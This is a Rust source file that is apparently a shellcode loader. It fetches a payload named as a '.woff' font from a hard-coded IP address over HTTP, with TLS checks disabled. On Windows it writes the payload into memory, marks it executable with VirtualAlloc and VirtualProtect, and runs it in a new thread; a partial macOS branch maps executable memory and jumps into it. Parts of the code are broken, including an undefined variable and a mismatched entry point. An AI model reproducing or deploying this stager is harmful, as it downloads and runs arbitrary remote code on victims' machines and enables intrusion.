use winapi::um::winnt::{PVOID, MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
// use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::processthreadsapi;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::errhandlingapi;
use winapi::um::winbase;
use std::ptr;
use std::process;
use bytes::{Bytes};
use mmap::{MapOption, MemoryMap};

type DWORD = u32;

fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    return rbytes
}

#[cfg(target_os = "macos")]
fn dne() {
    let rbytes = getscode("http://192.168.78.129:8181/test.woff");
    let map = MemoryMap::new(
        instructions.len(),
        &[
            MapOption::MapAddr(0 as *mut u8),
            MapOption::MapOffset(0),
            MapOption::MapFd(-1),
            MapOption::MapReadable,
            MapOption::MapWritable,
            MapOption::MapExecutable,
            MapOption::MapNonStandardFlags(libc::MAP_ANON),
            MapOption::MapNonStandardFlags(libc::MAP_PRIVATE),
        ],
    )
    .unwrap();
    let func: unsafe extern "C" fn() = mem::transmute(map.data());
    func();
}

#[cfg(target_os = "windows")]
fn dne_win() {
    //download the payload
    let rbytes = getscode("http://192.168.78.129:8080/test.woff");
    // allocate and copy
    unsafe {
        let base_addr = kernel32::VirtualAlloc(ptr::null_mut(), rbytes.len().try_into().unwrap(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if base_addr.is_null() { 
            println!("[-] Couldn't allocate memory to current proc.")
        } else {
            println!("[+] Allocated memory to current proc.");
        }

        std::ptr::copy(rbytes.as_ptr() as  _, base_addr, rbytes.len());

        let mut old_protect: DWORD = PAGE_READWRITE;
        let mem_protect = kernel32::VirtualProtect (
            base_addr,
            rbytes.len() as u64,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if mem_protect == 0 {
            let error = errhandlingapi::GetLastError();
            println!("[-] Error: {}", error.to_string());
            process::exit(0x0100);
        }

        let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
        let mut tid = 0;
        let h_thread = processthreadsapi::CreateThread(
            ptr::null_mut(),
            0,
            Some(ep),
            ptr::null_mut(),
            0,
            &mut tid
        );
        if h_thread.is_null() {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        
        } else {
            println!("[+] Thread Id: {}", tid)
        }
        // wait 5eva
        let status = WaitForSingleObject(h_thread, winbase::INFINITE);
        if status == 0 {
            println!("d")
        } else {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        }
    }

    
}

fn main() {
    dne();
}
